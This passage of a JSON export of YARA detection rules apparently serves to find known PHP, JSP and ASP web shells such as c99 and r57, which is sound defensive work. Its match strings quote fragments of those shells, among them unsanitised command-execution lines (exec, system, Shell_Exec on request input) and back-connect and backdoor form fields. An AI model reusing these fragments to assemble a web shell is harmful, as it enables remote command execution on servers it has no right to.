Runtime.getRuntime().exec(\\\"cmd.exe /C \\\" + cmd);\" fullword\n      $s2 = \"cmdjsp.jsp\" \n      $s3 = \"michaeldaw.org\" fullword\n   condition: \n      2 of them\n}","date":"2014-03-29 11:31:01","description":"Semi-Auto-generated - file cmdjsp.jsp.txt","minimum_yara":"1.7","name":"Webshell_cmdjsp_jsp_RID2ED3","reference":"-","required_modules":[],"rule_hash":"7d5e12f321f2eead9e89c7c7daabc9ea","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_h4ntu_shell__powered_by_tsoi__RID367B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file h4ntu shell [powered by tsoi].txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 16:57:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"h4ntu shell\" \n      $s1 = \"system(\\\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\\\");\" \n   condition: \n      1 of them\n}","date":"2014-03-29 16:57:41","description":"Semi-Auto-generated - file h4ntu shell [powered by tsoi].txt","minimum_yara":"1.7","name":"Webshell_h4ntu_shell__powered_by_tsoi__RID367B","reference":"-","required_modules":[],"rule_hash":"79c16815b63984713315f04934e85c0f","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Ajan_asp_RID2DC3 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file Ajan.asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 10:45:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"c:\\\\downloaded.zip\" \n      $s2 = \"Set entrika = entrika.CreateTextFile(\\\"c:\\\\net.vbs\\\", True)\" fullword\n      $s3 = \"http://www35.websamba.com/cybervurgun/\" \n   condition: \n      1 of them\n}","date":"2014-03-29 10:45:41","description":"Semi-Auto-generated - file Ajan.asp.txt","minimum_yara":"1.7","name":"Webshell_Ajan_asp_RID2DC3","reference":"-","required_modules":[],"rule_hash":"454801e1476bd8a169f89833af7730f8","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_PHANTASMA_php_RID2EEA : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file PHANTASMA.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:34:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \">[*] Safemode Mode Run</DIV>\" \n      $s1 = \"$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>\" \n      $s2 = \"[*] Spawning Shell\" \n      $s3 = \"Cha0s\" \n   condition: \n      2 of them\n}","date":"2014-03-29 11:34:51","description":"Semi-Auto-generated - file PHANTASMA.php.txt","minimum_yara":"1.7","name":"Webshell_PHANTASMA_php_RID2EEA","reference":"-","required_modules":[],"rule_hash":"8781c37ea5ee5b11297183f4e1e49c92","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_MySQL_Web_Interface_Version_0_8_php_RID37DB : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file MySQL Web Interface Version 0.8.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 17:56:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"SooMin Kim\" \n      $s1 = \"http://popeye.snu.ac.kr/~smkim/mysql\" \n      $s2 = \"href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename\" \n      $s3 = \"<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi\" \n   condition: \n      2 of them\n}","date":"2014-03-29 17:56:21","description":"Semi-Auto-generated - file MySQL Web Interface Version 0.8.php.txt","minimum_yara":"1.7","name":"Webshell_MySQL_Web_Interface_Version_0_8_php_RID37DB","reference":"-","required_modules":[],"rule_hash":"977b02aa1312a21c3cadbb2ee55f6b50","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_simple_cmd_html_RID30D7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - file simple_cmd.html.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:57:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<title>G-Security Webshell</title>\" fullword\n      $s2 = \"<input type=TEXT name=\\\"-cmd\\\" size=64 value=\\\"<?=$cmd?>\\\" \" fullword\n      $s3 = \"<? if($cmd != \\\"\\\") print Shell_Exec($cmd);?>\" fullword\n      $s4 = \"<? $cmd = $_REQUEST[\\\"-cmd\\\"];?>\" fullword\n   condition: \n      all of them\n}","date":"2014-03-29 12:57:01","description":"Semi-Auto-generated - file simple_cmd.html.txt","minimum_yara":"1.7","name":"Webshell_simple_cmd_html_RID30D7","reference":"-","required_modules":[],"rule_hash":"1311c071f586a80bfeddd4c76c0dc9e6","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell__1_c2007_php_php_c100_php_RID3309 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files 1.txt, c2007.php.php.txt, c100.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:30:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo \\\"<b>Changing file-mode (\\\".$d.$f.\\\"), \\\".view_perms_color($d.$f).\\\" (\\\"\" \n      $s3 = \"echo \\\"<td>&nbsp;<a href=\\\\\\\"\\\".$sql_surl.\\\"sql_act=query&sql_query=\\\".ur\" \n   condition: \n      1 of them\n}","date":"2014-03-29 14:30:41","description":"Semi-Auto-generated - from files 1.txt, c2007.php.php.txt, c100.php.txt","minimum_yara":"1.7","name":"Webshell__1_c2007_php_php_c100_php_RID3309","reference":"-","required_modules":[],"rule_hash":"e43084c84635549f7f50eca296fd0b4d","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_nst_perl_proxy_shell_RID3325 : DEMO T1090 T1100 T1105 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:35:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1090, T1100, T1105, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i\" \n      $s1 = \"$perl_proxy_scp = \\\"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v\" \n      $s2 = \"<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input\" \n   condition: \n      1 of them\n}","date":"2014-03-29 14:35:21","description":"Semi-Auto-generated - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt","minimum_yara":"1.7","name":"Webshell_nst_perl_proxy_shell_RID3325","reference":"-","required_modules":[],"rule_hash":"7758881dee28a22bd65401fcc6bdca98","score":75,"tags":["T1100","T1090","DEMO","WEBSHELL","T1105"]},{"author":"Florian Roth","content":"rule Webshell_SpecialShell_99a_RID3091 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated \"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:45:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$sess_data[\\\"cut\\\"] = array(); c99_s\" \n      $s3 = \"if ((!eregi(\\\"http://\\\",$uploadurl)) and (!eregi(\\\"https://\\\",$uploadurl))\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:45:21","description":"Semi-Auto-generated ","minimum_yara":"1.7","name":"Webshell_SpecialShell_99a_RID3091","reference":"-","required_modules":[],"rule_hash":"6bf97758674f6932c51d4d0cf37af64c","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_SpecialShell_99b_RID3092 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:45:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\"<td>&nbsp;<a href=\\\\\\\"\\\".$sql_surl.\\\"sql_act=query&sql_query=\\\".ur\" \n      $s2 = \"c99sh_sqlquery\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:45:31","description":"Semi-Auto-generated - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt","minimum_yara":"1.7","name":"Webshell_SpecialShell_99b_RID3092","reference":"-","required_modules":[],"rule_hash":"f659e35bc92b391c76af8961621a5e57","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99shell_v1_0_SsEs_RID3105 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s3 = \"if (!empty($delerr)) {echo \\\"<b>Deleting with errors:</b><br>\\\".$delerr;}\" fullword\n   condition: \n      1 of them\n}","date":"2014-03-29 13:04:41","description":"Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt","minimum_yara":"1.7","name":"Webshell_c99shell_v1_0_SsEs_RID3105","reference":"-","required_modules":[],"rule_hash":"7c6d773da2ae0ed8976987173e00082d","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_network_php_xinfo_RID31DA : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files network.php.php.txt, xinfo.php.php.txt, nfm.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:40:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa\" \n      $s2 = \"<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''\" \n   condition: \n      all of them\n}","date":"2014-03-29 13:40:11","description":"Semi-Auto-generated - from files network.php.php.txt, xinfo.php.php.txt, nfm.php.php.txt","minimum_yara":"1.7","name":"Webshell_network_php_xinfo_RID31DA","reference":"-","required_modules":[],"rule_hash":"6a15337a5b5f258f0f6524a8bd89bcbf","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_SpecialShell_99_php_php_RID337E : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 14:50:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo \\\"<hr size=\\\\\\\"1\\\\\\\" noshade><b>Done!</b><br>Total time (secs.): \\\".$ft\" \n      $s3 = \"$fqb_log .= \\\"\\\\r\\\\n------------------------------------------\\\\r\\\\nDone!\\\\r\" \n   condition: \n      1 of them\n}","date":"2014-03-29 14:50:11","description":"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt","minimum_yara":"1.7","name":"Webshell_SpecialShell_99_php_php_RID337E","reference":"-","required_modules":[],"rule_hash":"d26d4758dffa42540238470a2c1caa63","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_r577_php_php_SnIpEr_2_RID322A : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:53:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"'eng_text71'=>\\\"Second commands param is:\\\\r\\\\n- for CHOWN - name of new owner o\" \n      $s4 = \"if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult\" \n   condition: \n      1 of them\n}","date":"2014-03-29 13:53:31","description":"Semi-Auto-generated - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt","minimum_yara":"1.7","name":"Webshell_r577_php_php_SnIpEr_2_RID322A","reference":"-","required_modules":[],"rule_hash":"af988fac2ee4dfb7620d573a3d5e1f9a","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99shell_v1_0_RID2F28 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, ctt_sh.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:45:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\\\"\" \n      $s2 = \"\\\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\\\"\" \n      $s4 = \"\\\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\\\"\" \n   condition: \n      2 of them\n}","date":"2014-03-29 11:45:11","description":"Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, ctt_sh.php.php.txt","minimum_yara":"1.7","name":"Webshell_c99shell_v1_0_RID2F28","reference":"-","required_modules":[],"rule_hash":"65288469ad3865934ffcd8413f50130a","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_r577_php_spy_RID2F1D : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:43:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"echo $te.\\\"<div align=center><textarea cols=35 name=db_query>\\\".(!empty($_POST['\" \n      $s3 = \"echo sr(45,\\\"<b>\\\".$lang[$language.'_text80'].$arrow.\\\"</b>\\\",\\\"<select name=db>\" \n   condition: \n      1 of them\n}","date":"2014-03-29 11:43:21","description":"Semi-Auto-generated - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt","minimum_yara":"1.7","name":"Webshell_r577_php_spy_RID2F1D","reference":"-","required_modules":[],"rule_hash":"f69397664d172ab9fb7c7e1bc008c94d","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99_generic_RID2EB7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated \"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:26:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"  if ($copy_unset) {foreach($sess_data[\\\"copy\\\"] as $k=>$v) {unset($sess_data[\\\"\" \n      $s1 = \"  if (file_exists($mkfile)) {echo \\\"<b>Make File \\\\\\\"\\\".htmlspecialchars($mkfile\" \n      $s2 = \"  echo \\\"<center><b>MySQL \\\".mysql_get_server_info().\\\" (proto v.\\\".mysql_get_pr\" \n      $s3 = \"  elseif (!fopen($mkfile,\\\"w\\\")) {echo \\\"<b>Make File \\\\\\\"\\\".htmlspecialchars($m\" \n   condition: \n      all of them\n}","date":"2014-03-29 11:26:21","description":"Semi-Auto-generated ","minimum_yara":"1.7","name":"Webshell_c99_generic_RID2EB7","reference":"-","required_modules":[],"rule_hash":"64f8db001787c75ad9d3a2e618e829dd","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99_generic2_RID2EE9 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated \"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 11:34:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \" if ($mode & 0x200) {$world[\\\"execute\\\"] = ($world[\\\"execute\\\"] == \\\"x\\\")?\\\"t\\\":\" \n      $s1 = \" $group[\\\"execute\\\"] = ($mode & 00010)?\\\"x\\\":\\\"-\\\";\" fullword\n   condition: \n      all of them\n}","date":"2014-03-29 11:34:41","description":"Semi-Auto-generated ","minimum_yara":"1.7","name":"Webshell_c99_generic2_RID2EE9","reference":"-","required_modules":[],"rule_hash":"97561d90e6eaa54fdf32eacc703d59f4","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_c99shell_v1_PHP_RID2FE0 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:15:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"$result = mysql_query(\\\"SHOW PROCESSLIST\\\", $sql_sock); \" fullword\n   condition: \n      all of them\n}","date":"2014-03-29 12:15:51","description":"Semi-Auto-generated - from files c99shell_v1.0.php.php.txt, c99php.txt, 1.txt, c2007.php.php.txt, c100.php.txt","minimum_yara":"1.7","name":"Webshell_c99shell_v1_PHP_RID2FE0","reference":"-","required_modules":[],"rule_hash":"bb7d59556f0cedac80654c518da6649d","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_multiple_php_webshells_2_RID3472 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated \"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 15:30:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"elseif (!empty($ft)) {echo \\\"<center><b>Manually selected type is incorrect. I\" \n      $s1 = \"else {echo \\\"<center><b>Unknown extension (\\\".$ext.\\\"), please, select type ma\" \n      $s3 = \"$s = \\\"!^(\\\".implode(\\\"|\\\",$tmp).\\\")$!i\\\";\" fullword\n   condition: \n      all of them\n}","date":"2014-03-29 15:30:51","description":"Semi-Auto-generated ","minimum_yara":"1.7","name":"Webshell_multiple_php_webshells_2_RID3472","reference":"-","required_modules":[],"rule_hash":"52be6ddcb48702c0f70c63724c1bd1d0","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_SpecialShell_99c_RID3093 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 12:45:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"else {$act = \\\"f\\\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA\" \n      $s3 = \"else {echo \\\"<b>File \\\\\\\"\\\".$sql_getfile.\\\"\\\\\\\":</b><br>\\\".nl2br(htmlspec\" \n   condition: \n      1 of them\n}","date":"2014-03-29 12:45:41","description":"Semi-Auto-generated - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt","minimum_yara":"1.7","name":"Webshell_SpecialShell_99c_RID3093","reference":"-","required_modules":[],"rule_hash":"94c2e7d5738706d351b5f4d505ed725a","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_r577_php_php_SnIpEr_3_RID322B : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:53:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo sr(15,\\\"<b>\\\".$lang[$language.'_text\" \n      $s1 = \".$arrow.\\\"</b>\\\",in('text','\" \n   condition: \n      2 of them\n}","date":"2014-03-29 13:53:41","description":"Semi-Auto-generated - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt, spy.php.php.txt, s.php.php.txt","minimum_yara":"1.7","name":"Webshell_r577_php_php_SnIpEr_3_RID322B","reference":"-","required_modules":[],"rule_hash":"f10b293babd8ce3b828ac3e8017ad709","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_r577_php_php_SnIpEr_RID3199 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 13:29:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash',\" fullword\n      $s1 = \"$name='ec371748dc2da624b35a4f8f685dd122'\" \n      $s2 = \"rst.void.ru\" \n   condition: \n      3 of them\n}","date":"2014-03-29 13:29:21","description":"Semi-Auto-generated - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt","minimum_yara":"1.7","name":"Webshell_r577_php_php_SnIpEr_RID3199","reference":"-","required_modules":[],"rule_hash":"44fbe588ded3fd0f3aa5d4a6be71dca5","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_Spy_r57_RID2D1F : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files r577.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 10:18:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"echo ws(2).$lb.\\\" <a\" \n      $s1 = \"$sql = \\\"LOAD DATA INFILE \\\\\\\"\\\".$_POST['test3_file']\" \n      $s3 = \"if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\\\"dir\\\"):(\\\"l\" \n   condition: \n      2 of them\n}","date":"2014-03-29 10:18:21","description":"Semi-Auto-generated - from files r577.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt","minimum_yara":"1.7","name":"Webshell_Spy_r57_RID2D1F","reference":"-","required_modules":[],"rule_hash":"fc8ee53d148790ad11b9e21b800bdd39","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_SpecialShell_99_php_php_c100_php_RID3678 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 16:57:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if(eregi(\\\"./shbd $por\\\",$scan))\" \n      $s1 = \"$_POST['backconnectip']\" \n      $s2 = \"$_POST['backcconnmsg']\" \n   condition: \n      1 of them\n}","date":"2014-03-29 16:57:11","description":"Semi-Auto-generated - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt","minimum_yara":"1.7","name":"Webshell_SpecialShell_99_php_php_c100_php_RID3678","reference":"-","required_modules":[],"rule_hash":"18ca643a48a6c107e299dabd81aa4025","score":75,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule Webshell_r577_php_RID2D62 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Semi-Auto-generated - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-03-29 10:29:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"if(rmdir($_POST['mk_name']))\" \n      $s2 = \"$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>\" \n      $s3 = \"if(unlink($_POST['mk_name'])) echo \\\"<table width=100% cellpadding=0 cell\" \n   condition: \n      2 of them\n}","date":"2014-03-29 10:29:31","description":"Semi-Auto-generated - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, 